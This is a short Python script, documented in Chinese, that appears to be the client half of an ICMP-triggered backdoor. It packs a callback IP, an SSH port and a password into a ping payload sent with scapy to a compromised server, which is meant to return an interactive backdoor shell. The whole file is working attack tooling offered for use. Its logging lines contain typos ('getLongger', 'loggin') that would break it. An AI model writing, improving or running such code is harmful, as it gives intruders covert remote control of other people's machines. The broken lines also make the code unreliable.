'''
客户端代码。将服务端的 IP 地址、客户端的 IP 地址、客户端的连接端口，以及连接所需密码作为程序输入。如果成功返回一个交互式后门，在代码硬编码好的位置写入日志文件信息。
'''

#! /usr/bin/env python
import logging
import socket
from scapy.all import *
import os
import os.path
import sys
import time

logging.getLongger("scapy.runtime").setLevel(loggin.ERROR)

file_result = "/tmp/done"

if len(sys.argv) != 5:
	print ("usage : " + " IP_SERVER " + " CLIENT_IP " + "  PORT_SSH_CLIENT " + " PASSWORD_CLIENT ")
	sys.exit(1)
server = sys.argv[1]

if os.path.isfile(file_result):
	os.remove(file_result)
load = sys.argv[2] + "|" + sys.argv[3] + "|" + sys.argv[4]
pingr = IP(dst = server) / ICMP() / load
send(pingr, verbose = 0)		# send() 函数工作在协议栈的第三层（网络层）